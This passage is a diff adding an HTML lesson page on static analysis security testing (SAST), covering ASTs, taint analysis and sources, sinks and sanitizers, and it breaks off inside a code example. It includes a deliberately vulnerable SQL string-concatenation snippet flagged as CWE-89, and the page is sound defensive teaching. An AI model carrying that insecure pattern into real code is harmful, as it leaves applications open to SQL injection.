@@ -1,0 +1,1765 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AppSec Engineer — Lesson 4: SAST</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Inconsolata:wght@400;500;600;700&family=Playfair+Display:wght@700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #fafaf7;
+  --surface: #ffffff;
+  --surface2: #f4f3ee;
+  --surface3: #eeede6;
+  --border: #e2e0d8;
+  --border2: #d4d2c8;
+  --ink: #1c1b18;
+  --ink2: #52504a;
+  --ink3: #9a9890;
+  --accent: #d4500a;
+  --accent2: #1a6b3c;
+  --accent3: #1a4080;
+  --yellow: #b87d00;
+  --red: #c0251e;
+  --green: #1a6b3c;
+  --blue: #1a4080;
+  --purple: #6b2d9b;
+  --teal: #0d6b5e;
+  --code-bg: #14130f;
+  --code-text: #e8e4d8;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:'Plus Jakarta Sans',sans-serif;
+  font-size:15px;
+  line-height:1.8;
+}
+
+/* SIDEBAR */
+.sidebar{
+  position:fixed;left:0;top:0;bottom:0;width:250px;
+  background:var(--ink);overflow-y:auto;z-index:100;
+}
+.sb-brand{
+  padding:1.4rem 1.2rem 1rem;
+  border-bottom:1px solid rgba(255,255,255,0.07);
+}
+.sb-badge{
+  font-family:'Inconsolata',monospace;font-size:9px;
+  background:var(--accent);color:#fff;padding:2px 8px;
+  border-radius:2px;letter-spacing:.12em;display:inline-block;
+  margin-bottom:7px;text-transform:uppercase;font-weight:700;
+}
+.sb-brand h2{font-size:13px;font-weight:500;color:rgba(255,255,255,0.6);line-height:1.4;}
+.sb-sect{
+  padding:.7rem 1.2rem .2rem;font-size:9px;font-weight:700;
+  letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,0.2);margin-top:.25rem;
+}
+.nav-item{
+  display:flex;align-items:center;gap:9px;padding:.38rem 1.2rem;
+  cursor:pointer;border-left:2px solid transparent;
+  font-size:12.5px;color:rgba(255,255,255,0.3);
+  text-decoration:none;transition:all .15s;
+}
+.nav-item:hover{color:rgba(255,255,255,0.7);background:rgba(255,255,255,0.04);}
+.nav-item.done{color:rgba(255,255,255,0.35);}
+.nav-item.active{color:#fff;border-left-color:var(--accent);background:rgba(212,80,10,0.12);}
+.nav-item .num{font-family:'Inconsolata',monospace;font-size:10px;min-width:22px;opacity:.35;}
+.nav-item.active .num{opacity:1;color:var(--accent);}
+
+/* MAIN */
+.main{margin-left:250px;}
+.topbar{
+  position:sticky;top:0;background:rgba(250,250,247,0.95);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--border);
+  padding:.65rem 2.5rem;display:flex;align-items:center;justify-content:space-between;z-index:50;
+}
+.bc{font-family:'Inconsolata',monospace;font-size:11px;color:var(--ink3);}
+.bc span{color:var(--accent);font-weight:700;}
+.top-badge{
+  font-family:'Inconsolata',monospace;font-size:10px;
+  padding:3px 10px;background:var(--ink);color:rgba(255,255,255,0.7);border-radius:2px;
+}
+
+.content{padding:3rem 2.5rem 5rem;max-width:940px;}
+
+/* HERO */
+.hero{margin-bottom:3.5rem;padding-bottom:2.5rem;border-bottom:2px solid var(--border);}
+.hero-meta{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:1rem;}
+.tag{
+  font-family:'Inconsolata',monospace;font-size:10px;
+  padding:3px 10px;border-radius:2px;font-weight:600;letter-spacing:.05em;
+}
+.t-beg{background:rgba(26,107,60,0.1);color:var(--green);border:1px solid rgba(26,107,60,0.2);}
+.t-tool{background:rgba(26,64,128,0.1);color:var(--blue);border:1px solid rgba(26,64,128,0.2);}
+.t-time{background:rgba(107,45,155,0.1);color:var(--purple);border:1px solid rgba(107,45,155,0.2);}
+.hero h1{
+  font-family:'Playfair Display',serif;
+  font-size:3.5rem;font-weight:900;line-height:1.1;
+  color:var(--ink);margin-bottom:.85rem;
+  letter-spacing:-.02em;
+}
+.hero h1 .hl{color:var(--accent);}
+.hero-sub{font-size:14.5px;color:var(--ink2);max-width:620px;line-height:1.75;margin-bottom:1.75rem;}
+.level-strip{
+  display:grid;grid-template-columns:repeat(3,1fr);
+  gap:1px;background:var(--border);
+  border:1px solid var(--border);border-radius:6px;overflow:hidden;
+}
+.lv-cell{background:var(--surface);padding:.9rem 1rem;}
+.lv-pip{width:8px;height:8px;border-radius:50%;margin-bottom:7px;}
+.lv-label{font-family:'Inconsolata',monospace;font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink3);margin-bottom:3px;}
+.lv-title{font-size:13px;font-weight:700;color:var(--ink);margin-bottom:2px;}
+.lv-desc{font-size:12px;color:var(--ink3);line-height:1.5;}
+
+/* SECTIONS */
+.section{margin-bottom:3.5rem;}
+.eyebrow{
+  font-family:'Inconsolata',monospace;font-size:10px;
+  text-transform:uppercase;letter-spacing:.15em;
+  color:var(--accent);margin-bottom:5px;font-weight:700;
+}
+.sec-title{
+  font-family:'Playfair Display',serif;
+  font-size:1.85rem;font-weight:800;color:var(--ink);
+  line-height:1.2;letter-spacing:-.01em;margin-bottom:.35rem;
+}
+.sec-sub{font-size:14px;color:var(--ink2);max-width:640px;line-height:1.75;margin-bottom:1.5rem;}
+
+/* CALLOUT */
+.callout{
+  border-radius:4px;padding:.9rem 1.1rem;
+  margin:1rem 0;display:flex;gap:10px;align-items:flex-start;
+  border-left:3px solid;
+}
+.cl-warn{background:rgba(192,37,30,0.05);border-color:var(--red);}
+.cl-info{background:rgba(26,64,128,0.05);border-color:var(--blue);}
+.cl-tip{background:rgba(26,107,60,0.05);border-color:var(--green);}
+.cl-note{background:rgba(184,125,0,0.06);border-color:var(--yellow);}
+.cl-icon{font-size:15px;flex-shrink:0;margin-top:2px;}
+.cl-text{font-size:13.5px;color:var(--ink2);line-height:1.7;}
+.cl-text strong{color:var(--ink);}
+.cl-text code{
+  font-family:'Inconsolata',monospace;font-size:12px;
+  background:rgba(0,0,0,0.06);padding:1px 5px;border-radius:2px;color:var(--accent);
+}
+
+/* CODE */
+pre{
+  background:var(--code-bg);color:var(--code-text);
+  border-radius:6px;padding:1.25rem;
+  font-family:'Inconsolata',monospace;font-size:13px;
+  line-height:1.75;overflow-x:auto;margin:.85rem 0;
+  position:relative;border:1px solid rgba(255,255,255,0.06);
+}
+.ctag{
+  position:absolute;top:10px;right:12px;
+  font-family:'Inconsolata',monospace;font-size:9px;
+  color:rgba(255,255,255,0.2);text-transform:uppercase;letter-spacing:.1em;
+}
+.ck{color:#c084fc;} .cf{color:#60a5fa;} .cs{color:#86efac;}
+.cm2{color:#4a4850;} .cv{color:#fbbf24;} .ce{color:#fb923c;}
+.cr2{color:#f87171;} .cg2{color:#4ade80;} .ct2{color:#2dd4bf;}
+.lb{display:block;background:rgba(248,113,113,0.1);border-left:2px solid #ef4444;margin:0 -1.25rem;padding:0 1.25rem;}
+.lg{display:block;background:rgba(74,222,128,0.08);border-left:2px solid #22c55e;margin:0 -1.25rem;padding:0 1.25rem;}
+.lw{display:block;background:rgba(251,191,36,0.08);border-left:2px solid #f59e0b;margin:0 -1.25rem;padding:0 1.25rem;}
+.ln{display:block;background:rgba(96,165,250,0.07);border-left:2px solid #3b82f6;margin:0 -1.25rem;padding:0 1.25rem;}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;font-size:13px;margin:1rem 0;}
+th{
+  padding:.55rem .9rem;text-align:left;
+  background:var(--ink);color:rgba(255,255,255,0.7);
+  font-family:'Inconsolata',monospace;font-size:10px;
+  text-transform:uppercase;letter-spacing:.08em;
+}
+th:first-child{border-radius:4px 0 0 0;}
+th:last-child{border-radius:0 4px 0 0;}
+td{padding:.55rem .9rem;border-bottom:1px solid var(--border);color:var(--ink2);line-height:1.5;vertical-align:top;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--surface2);}
+
+/* PANELS */
+.panel{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;margin-bottom:.75rem;
+}
+.panel-h{
+  display:flex;align-items:center;gap:10px;padding:.9rem 1.1rem;
+  cursor:pointer;transition:background .15s;user-select:none;
+}
+.panel-h:hover{background:var(--surface2);}
+.panel-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;}
+.panel-title{font-size:13.5px;font-weight:700;flex:1;color:var(--ink);}
+.panel-sub{font-size:12px;color:var(--ink3);}
+.panel-tog{color:var(--ink3);font-size:13px;transition:transform .2s;}
+.panel.open .panel-tog{transform:rotate(180deg);}
+.panel-body{display:none;padding:0 1.1rem 1.1rem;border-top:1px solid var(--border);}
+.panel.open .panel-body{display:block;}
+.panel-body h4{
+  font-family:'Inconsolata',monospace;font-size:10px;
+  text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);
+  margin:1rem 0 .5rem;font-weight:700;
+}
+.panel-body p{font-size:13.5px;color:var(--ink2);line-height:1.75;margin-top:.6rem;}
+
+/* TOOL CARDS */
+.tool-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;margin:1.25rem 0;}
+.tool-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:8px;padding:1.25rem;
+  transition:border-color .2s,transform .15s;cursor:pointer;
+}
+.tool-card:hover{border-color:var(--accent);transform:translateY(-2px);}
+.tool-card.selected{border-color:var(--accent);border-width:2px;}
+.tc-header{display:flex;align-items:center;gap:10px;margin-bottom:.75rem;}
+.tc-logo{
+  width:40px;height:40px;border-radius:6px;
+  display:flex;align-items:center;justify-content:center;
+  font-family:'Inconsolata',monospace;font-size:13px;font-weight:700;
+  flex-shrink:0;
+}
+.tc-name{font-size:14px;font-weight:700;color:var(--ink);}
+.tc-vendor{font-size:11px;color:var(--ink3);}
+.tc-desc{font-size:13px;color:var(--ink2);line-height:1.6;margin-bottom:.75rem;}
+.tc-pills{display:flex;flex-wrap:wrap;gap:5px;}
+.tc-pill{
+  font-family:'Inconsolata',monospace;font-size:10px;
+  padding:2px 8px;border-radius:2px;font-weight:600;
+}
+
+/* AST / TAINT DIAGRAM */
+.ast-wrap{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:8px;padding:1.5rem;margin:1.25rem 0;overflow-x:auto;
+}
+.ast-title{font-family:'Inconsolata',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);margin-bottom:1rem;}
+
+/* FINDING CARD */
+.finding{
+  background:var(--surface);border:1px solid var(--border);
+  border-left:4px solid;border-radius:0 6px 6px 0;
+  padding:1rem 1.1rem;margin-bottom:.75rem;
+  cursor:pointer;transition:background .15s;
+}
+.finding:hover{background:var(--surface2);}
+.finding.crit{border-left-color:var(--red);}
+.finding.high{border-left-color:var(--accent);}
+.finding.med{border-left-color:var(--yellow);}
+.finding.low{border-left-color:var(--green);}
+.finding.info{border-left-color:var(--ink3);}
+.finding-top{display:flex;align-items:flex-start;gap:1rem;justify-content:space-between;}
+.finding-title{font-size:13.5px;font-weight:700;color:var(--ink);margin-bottom:3px;}
+.finding-meta{font-size:12px;color:var(--ink3);font-family:'Inconsolata',monospace;}
+.finding-sev{
+  font-family:'Inconsolata',monospace;font-size:10px;
+  font-weight:700;padding:3px 10px;border-radius:2px;
+  flex-shrink:0;white-space:nowrap;
+}
+.sev-crit{background:rgba(192,37,30,0.1);color:var(--red);border:1px solid rgba(192,37,30,0.2);}
+.sev-high{background:rgba(212,80,10,0.1);color:var(--accent);border:1px solid rgba(212,80,10,0.2);}
+.sev-med{background:rgba(184,125,0,0.1);color:var(--yellow);border:1px solid rgba(184,125,0,0.2);}
+.sev-low{background:rgba(26,107,60,0.1);color:var(--green);border:1px solid rgba(26,107,60,0.2);}
+.finding-detail{display:none;margin-top:.85rem;padding-top:.85rem;border-top:1px solid var(--border);}
+.finding-detail.show{display:block;}
+.finding-detail h5{font-size:11px;font-family:'Inconsolata',monospace;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);margin:.75rem 0 .35rem;font-weight:700;}
+.finding-detail p{font-size:13px;color:var(--ink2);line-height:1.7;}
+
+/* RULES */
+.rule-card{
+  background:var(--surface2);border:1px solid var(--border);
+  border-radius:6px;padding:1rem 1.1rem;margin-bottom:.65rem;
+}
+.rule-id{font-family:'Inconsolata',monospace;font-size:11px;font-weight:700;color:var(--accent);margin-bottom:3px;}
+.rule-title{font-size:13.5px;font-weight:700;color:var(--ink);margin-bottom:.35rem;}
+.rule-desc{font-size:13px;color:var(--ink2);line-height:1.65;}
+
+/* PIPELINE STAGES */
+.pipe-wrap{display:flex;gap:0;margin:1.25rem 0;overflow-x:auto;padding-bottom:.5rem;}
+.pipe-stage{
+  flex:1;min-width:130px;
+  cursor:pointer;
+}
+.pipe-top{height:5px;}
+.pipe-stage:first-child .pipe-top{border-radius:4px 0 0 0;}
+.pipe-stage:last-child .pipe-top{border-radius:0 4px 0 0;}
+.pipe-inner{
+  border:1px solid var(--border);border-top:none;
+  padding:.75rem .85rem;background:var(--surface);
+  transition:background .15s;
+}
+.pipe-stage:hover .pipe-inner,.pipe-stage.act .pipe-inner{background:var(--surface2);}
+.pipe-stage.act .pipe-inner{border-color:var(--border2);}
+.pipe-num{font-family:'Inconsolata',monospace;font-size:9px;color:var(--ink3);margin-bottom:2px;letter-spacing:.08em;}
+.pipe-name{font-size:13px;font-weight:700;color:var(--ink);margin-bottom:3px;}
+.pipe-tag{font-size:11px;color:var(--ink3);line-height:1.4;}
+.pipe-detail{
+  display:none;border:1px solid var(--border);border-top:none;
+  padding:.75rem .85rem;background:var(--surface2);
+  font-size:13px;color:var(--ink2);line-height:1.65;
+}
+.pipe-stage.act .pipe-detail{display:block;}
+
+/* TWO COL */
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+.cb{background:rgba(192,37,30,0.04);border:1px solid rgba(192,37,30,0.18);border-radius:6px;padding:1rem;}
+.cg{background:rgba(26,107,60,0.04);border:1px solid rgba(26,107,60,0.18);border-radius:6px;padding:1rem;}
+.cmp-l{font-family:'Inconsolata',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.12em;font-weight:700;margin-bottom:.6rem;}
+.cb .cmp-l{color:var(--red);}
+.cg .cmp-l{color:var(--green);}
+
+/* QUIZ */
+.quiz-block{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.25rem;margin-bottom:1rem;}
+.quiz-q{font-size:14.5px;font-weight:700;color:var(--ink);margin-bottom:.85rem;line-height:1.55;}
+.quiz-opts{display:flex;flex-direction:column;gap:7px;margin-bottom:.75rem;}
+.qo{
+  padding:.65rem 1rem;border:1px solid var(--border);
+  border-radius:4px;cursor:pointer;font-size:13.5px;
+  color:var(--ink2);background:var(--surface2);transition:all .15s;
+}
+.qo:hover{border-color:var(--ink);color:var(--ink);}
+.qo.correct{border-color:var(--green);color:var(--green);background:rgba(26,107,60,0.06);cursor:default;}
+.qo.wrong{border-color:var(--red);color:var(--red);background:rgba(192,37,30,0.06);cursor:default;}
+.quiz-exp{
+  font-size:13px;color:var(--ink2);line-height:1.7;
+  padding:.75rem 1rem;background:var(--surface2);
+  border-radius:4px;border-left:3px solid var(--green);
+  display:none;margin-top:.5rem;
+}
+.quiz-exp.show{display:block;}
+.quiz-exp code{font-family:'Inconsolata',monospace;font-size:12px;background:rgba(0,0,0,0.06);padding:1px 5px;border-radius:2px;color:var(--accent);}
+
+/* CHALLENGE */
+.challenge{
+  background:var(--ink);border-radius:10px;
+  padding:2rem;margin:3rem 0;position:relative;overflow:hidden;
+}
+.challenge::before{
+  content:'';position:absolute;top:-80px;right:-80px;
+  width:250px;height:250px;
+  background:radial-gradient(circle,rgba(212,80,10,0.12) 0%,transparent 70%);
+  pointer-events:none;
+}
+.ch-ey{font-family:'Inconsolata',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.15em;color:var(--accent);margin-bottom:.5rem;}
+.ch h3{font-family:'Playfair Display',serif;font-size:1.5rem;font-weight:800;color:#fff;margin-bottom:.7rem;}
+.ch-desc{font-size:13.5px;color:rgba(255,255,255,0.5);line-height:1.7;margin-bottom:1.25rem;}
+.scenario{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:5px;padding:1rem 1.1rem;margin-bottom:1.25rem;}
+.scenario p{font-size:13px;color:rgba(255,255,255,0.6);line-height:1.7;}
+.scenario strong{color:rgba(255,255,255,0.9);}
+.challenge textarea{
+  width:100%;min-height:160px;
+  background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);
+  border-radius:4px;padding:1rem;
+  font-family:'Inconsolata',monospace;font-size:12.5px;
+  color:rgba(255,255,255,0.85);resize:vertical;outline:none;
+  transition:border-color .2s;margin-bottom:1rem;
+}
+.challenge textarea:focus{border-color:var(--accent);}
+.challenge textarea::placeholder{color:rgba(255,255,255,0.2);}
+.btn-row{display:flex;gap:10px;flex-wrap:wrap;}
+.btn{padding:9px 20px;border-radius:4px;font-size:13px;font-family:'Plus Jakarta Sans',sans-serif;font-weight:700;cursor:pointer;border:1px solid;transition:all .15s;}
+.btn-p{background:var(--accent);color:#fff;border-color:var(--accent);}
+.btn-p:hover{background:#b84008;}
+.btn-g{background:transparent;color:rgba(255,255,255,0.5);border-color:rgba(255,255,255,0.15);}
+.btn-g:hover{color:#fff;border-color:rgba(255,255,255,0.4);}
+.ch-fb{margin-top:1rem;padding:1rem 1.1rem;border-radius:5px;font-size:13.5px;line-height:1.7;display:none;}
+.ch-fb.show{display:block;}
+.ch-fb.good{background:rgba(26,107,60,0.15);border:1px solid rgba(26,107,60,0.3);color:#4ade80;}
+.ch-fb.hint{background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.25);color:#fbbf24;}
+.ch-fb.reveal{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:rgba(255,255,255,0.75);}
+.ch-fb strong{color:#fff;}
+.ch-fb code{font-family:'Inconsolata',monospace;font-size:11.5px;background:rgba(255,255,255,0.08);padding:1px 5px;border-radius:2px;}
+
+/* PILL */
+.pill{font-size:11px;padding:3px 9px;border-radius:2px;font-family:'Inconsolata',monospace;font-weight:600;}
+.pr{background:rgba(192,37,30,0.08);color:var(--red);border:1px solid rgba(192,37,30,0.2);}
+.pg{background:rgba(26,107,60,0.08);color:var(--green);border:1px solid rgba(26,107,60,0.2);}
+.py{background:rgba(184,125,0,0.08);color:var(--yellow);border:1px solid rgba(184,125,0,0.2);}
+.pb{background:rgba(26,64,128,0.08);color:var(--blue);border:1px solid rgba(26,64,128,0.2);}
+.pp{background:rgba(107,45,155,0.08);color:var(--purple);border:1px solid rgba(107,45,155,0.2);}
+.pill-row{display:flex;flex-wrap:wrap;gap:6px;margin:.5rem 0;}
+
+/* RW BOX */
+.rw-box{background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:1rem 1.1rem;margin:.85rem 0;}
+.rw-label{font-family:'Inconsolata',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:var(--accent);margin-bottom:5px;font-weight:700;}
+.rw-box p{font-size:13px;color:var(--ink2);line-height:1.7;}
+
+/* NAV FOOTER */
+.nav-footer{display:flex;justify-content:space-between;margin-top:4rem;padding-top:2rem;border-top:2px solid var(--border);}
+.nf-btn{
+  padding:.85rem 1.5rem;border:1px solid var(--border);
+  border-radius:4px;font-size:13px;cursor:pointer;
+  background:var(--surface);color:var(--ink2);
+  text-align:left;transition:all .15s;text-decoration:none;display:block;
+}
+.nf-btn:hover{border-color:var(--ink);}
+.nf-btn.next{background:var(--ink);color:#fff;border-color:var(--ink);text-align:right;}
+.nf-btn.next:hover{background:#2e2b24;}
+.nf-dir{font-family:'Inconsolata',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);display:block;margin-bottom:3px;}
+.nf-btn.next .nf-dir{color:rgba(255,255,255,0.35);}
+.nf-title{font-weight:700;display:block;}
+
+/* inline code */
+code{font-family:'Inconsolata',monospace;font-size:12.5px;background:rgba(0,0,0,0.06);padding:1px 5px;border-radius:2px;color:var(--accent);}
+pre code{background:none;padding:0;color:inherit;font-size:inherit;}
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+
+@media(max-width:860px){
+  .sidebar{display:none;}.main{margin-left:0;}
+  .content{padding:1.5rem 1.1rem 3rem;}
+  .level-strip{grid-template-columns:1fr;}
+  .two-col{grid-template-columns:1fr;}
+  .tool-grid{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sb-brand">
+    <div class="sb-badge">AppSec Engineer</div>
+    <h2>Application Security<br>Learning Path</h2>
+  </div>
+  <div class="sb-sect">Module 1 — Foundations</div>
+  <a class="nav-item done" href="#"><span class="num">01</span>OWASP Top 10 2021</a>
+  <a class="nav-item done" href="#"><span class="num">02</span>Secure SDLC</a>
+  <a class="nav-item done" href="#"><span class="num">03</span>Threat Modeling</a>
+  <div class="sb-sect">Module 2 — Testing Tools</div>
+  <a class="nav-item active" href="#"><span class="num">04</span>SAST</a>
+  <a class="nav-item" href="#"><span class="num">05</span>DAST</a>
+  <a class="nav-item" href="#"><span class="num">06</span>SCA</a>
+  <a class="nav-item" href="#"><span class="num">07</span>IAST &amp; RASP</a>
+  <div class="sb-sect">Module 3 — API Security</div>
+  <a class="nav-item" href="#"><span class="num">08</span>OWASP API Top 10</a>
+  <a class="nav-item" href="#"><span class="num">09</span>API Security Testing</a>
+  <a class="nav-item" href="#"><span class="num">10</span>GraphQL Security</a>
+  <div class="sb-sect">Module 4 — DevSecOps</div>
+  <a class="nav-item" href="#"><span class="num">11</span>DevSecOps Pipeline</a>
+  <a class="nav-item" href="#"><span class="num">12</span>Secrets Management</a>
+  <a class="nav-item" href="#"><span class="num">13</span>Container Security</a>
+  <a class="nav-item" href="#"><span class="num">14</span>Dependency Scanning</a>
+  <a class="nav-item" href="#"><span class="num">15</span>SBOM</a>
+  <div class="sb-sect">Module 5 — Architecture</div>
+  <a class="nav-item" href="#"><span class="num">16</span>Security Architecture</a>
+  <a class="nav-item" href="#"><span class="num">17</span>Supply Chain Security</a>
+  <a class="nav-item" href="#"><span class="num">18</span>WAF</a>
+  <a class="nav-item" href="#"><span class="num">19</span>Code Review</a>
+  <a class="nav-item" href="#"><span class="num">20</span>RASP</a>
+</nav>
+
+<div class="main">
+<div class="topbar">
+  <div class="bc">appsec-engineer / module-2 / <span>sast</span></div>
+  <div class="top-badge">Lesson 04 / 20</div>
+</div>
+
+<div class="content">
+
+<!-- ══════════════════════════════════════════ HERO -->
+<div class="hero">
+  <div class="hero-meta">
+    <span class="tag t-beg">Beginner → Advanced</span>
+    <span class="tag t-tool">Tool</span>
+    <span class="tag t-time">~65 min</span>
+  </div>
+  <h1>SAST<br><span class="hl">Static Analysis</span><br>Security Testing</h1>
+  <p class="hero-sub">SAST is the practice of analyzing your source code, bytecode, or binary — without executing it — to find security vulnerabilities. It's the earliest automated security gate in your pipeline, running on every commit. This lesson takes you from "what does SAST even do?" to writing custom rules, tuning false positives, and integrating it into CI/CD so nothing insecure can ship.</p>
+  <div class="level-strip">
+    <div class="lv-cell">
+      <div class="lv-pip" style="background:var(--green)"></div>
+      <div class="lv-label">Beginner</div>
+      <div class="lv-title">How SAST works</div>
+      <div class="lv-desc">What SAST is, how it reads code without running it, ASTs, taint analysis, and why it matters</div>
+    </div>
+    <div class="lv-cell">
+      <div class="lv-pip" style="background:var(--yellow)"></div>
+      <div class="lv-label">Intermediate</div>
+      <div class="lv-title">Tools &amp; findings</div>
+      <div class="lv-desc">Bandit, Semgrep, SonarQube, CodeQL — real findings with vulnerable code, fixes, and CWE mappings</div>
+    </div>
+    <div class="lv-cell">
+      <div class="lv-pip" style="background:var(--red)"></div>
+      <div class="lv-label">Advanced</div>
+      <div class="lv-title">Custom rules &amp; CI/CD</div>
+      <div class="lv-desc">Write Semgrep rules from scratch, tune false positives, configure severity gates, integrate into GitHub Actions</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ BEGINNER: WHAT IS SAST -->
+<div class="section">
+  <div class="eyebrow">🟢 Beginner — Level 1</div>
+  <div class="sec-title">What is SAST and how does it work?</div>
+  <div class="sec-sub">SAST reads your code like a compiler reads it — as a data structure, not as a running program. Understanding this is fundamental to understanding what SAST can and cannot find.</div>
+
+  <p style="font-size:14.5px;color:var(--ink2);line-height:1.8;margin-bottom:1rem;">A human security reviewer reading code looks for patterns: "this function takes user input and passes it directly to the database — that's a SQL injection." SAST tools automate exactly that process. They parse your code into a structured representation and then run rules against that structure to find dangerous patterns.</p>
+
+  <div class="callout cl-info">
+    <div class="cl-icon">ℹ️</div>
+    <div class="cl-text"><strong>The key distinction — static vs dynamic:</strong> SAST analyzes code <em>without executing it</em>. This means it runs before you even have a running server, before any database connection, before any user input. It can find vulnerabilities in code paths that are rarely triggered in testing — including edge cases and error handlers that never fire in normal use.</div>
+  </div>
+
+  <!-- How SAST reads code -->
+  <div class="panel" id="pan-ast">
+    <div class="panel-h" onclick="tp('pan-ast')">
+      <div class="panel-dot" style="background:var(--green)"></div>
+      <div class="panel-title">How SAST reads code — Abstract Syntax Trees (ASTs)</div>
+      <div class="panel-sub">This is the internal representation every SAST tool uses</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+      <p>When you write <code>username = request.args.get('name')</code>, SAST doesn't see a string of text. It parses it into an Abstract Syntax Tree (AST) — a structured tree where every element of your code becomes a node with defined relationships.</p>
+      <h4>What an AST looks like for a vulnerable line</h4>
+<pre>
+<span class="cm2"># Source code:</span>
+query = <span class="cs">"SELECT * FROM users WHERE name='"</span> + username + <span class="cs">"'"</span>
+
+<span class="cm2"># What SAST sees — the AST (simplified):</span>
+Assignment
+  ├── target: Variable("query")
+  └── value: BinaryOp("+")
+        ├── left: BinaryOp("+")
+        │     ├── left: StringLiteral("SELECT * FROM users WHERE name='")
+        │     └── right: Variable("username")    <span class="cm2">← SAST notes: is this tainted?</span>
+        └── right: StringLiteral("'")
+
+<span class="cm2"># SAST rule asks: "Is a tainted variable being concatenated into a SQL string?"</span>
+<span class="cm2"># Answer: YES → FINDING: SQL Injection (CWE-89) — HIGH severity</span>
+</pre>
+      <p>Rules are written against this AST structure — not against the raw text. This is why SAST is smarter than a simple grep: it understands code structure, scope, and data types. A grep for "SELECT" would miss injections in functions. SAST follows the actual variable from assignment to use.</p>
+
+      <h4>The 3 analysis techniques SAST tools use</h4>
+      <table>
+        <tr><th>Technique</th><th>What it does</th><th>Finds</th><th>Limitation</th></tr>
+        <tr>
+          <td style="font-weight:700;color:var(--green)">Pattern matching</td>
+          <td>Matches AST patterns — e.g., "call to subprocess.call() with shell=True"</td>
+          <td>Known-bad API usage, dangerous function calls, hardcoded strings</td>
+          <td>Only finds what rules explicitly look for. Misses novel patterns.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:700;color:var(--blue)">Taint analysis</td>
+          <td>Tracks user-controlled data from source (input) to sink (dangerous use). Flags when tainted data reaches a sink without sanitization.</td>
+          <td>SQLi, XSS, command injection, path traversal, SSRF, XXE</td>
+          <td>Can miss flows through complex OOP, reflection, or dynamic dispatch.</td>
+        </tr>
+        <tr>
+          <td style="font-weight:700;color:var(--purple)">Data flow / control flow analysis</td>
+          <td>Builds a graph of all possible execution paths and data values at each point</td>
+          <td>Dead code with vulns, unreachable sanitization, conditional auth bypasses</td>
+          <td>Path-sensitive analysis is computationally expensive; many tools approximate.</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- Taint Analysis Explained -->
+  <div class="panel" id="pan-taint">
+    <div class="panel-h" onclick="tp('pan-taint')">
+      <div class="panel-dot" style="background:var(--blue)"></div>
+      <div class="panel-title">Taint analysis — following user data through your code</div>
+      <div class="panel-sub">The most powerful SAST technique — and the one behind every injection finding</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+      <p>Taint analysis models the flow of untrusted (tainted) data through your program. It starts at <strong>sources</strong> (where untrusted data enters), follows it through every assignment and function call, and checks whether it reaches a <strong>sink</strong> (a dangerous operation) without passing through a <strong>sanitizer</strong> (a function that makes it safe).</p>
+
+      <h4>Sources, Sinks, and Sanitizers</h4>
+      <table>
+        <tr><th>Concept</th><th>Definition</th><th>Examples</th></tr>
+        <tr>
+          <td style="color:var(--red);font-weight:700">Source</td>
+          <td>Where untrusted data enters your program from the outside world</td>
+          <td><code>request.args</code>, <code>request.form</code>, <code>request.json</code>, HTTP headers, URL path params, file upload contents, environment variables set by user, WebSocket messages</td>
+        </tr>
+        <tr>
+          <td style="color:var(--accent);font-weight:700">Sink</td>
+          <td>A dangerous operation that, if given attacker-controlled input, causes a vulnerability</td>
+          <td>SQL: <code>db.execute(query)</code> · OS: <code>subprocess.call(cmd)</code> · HTML: <code>render_template_string(html)</code> · File: <code>open(path)</code> · URL: <code>requests.get(url)</code> · Deserialize: <code>pickle.loads(data)</code></td>
+        </tr>
+        <tr>
+          <td style="color:var(--green);font-weight:700">Sanitizer</td>
+          <td>A function that neutralizes the taint — makes data safe for a specific sink</td>
+          <td>SQL: parameterized query (removes taint) · HTML: <code>markupsafe.escape()</code> · OS: allowlist validation · File: <code>os.path.basename()</code> + allowlist</td>
+        </tr>
+      </table>
+
+      <h4>Full taint flow — vulnerable path</h4>
+<pre>
+<span class="cm2"># Taint analysis traces this entire flow:</span>
+
+<span class="cf">from</span> flask <span class="cf">import</span> request
+<span class="cf">import</span> sqlite3
+
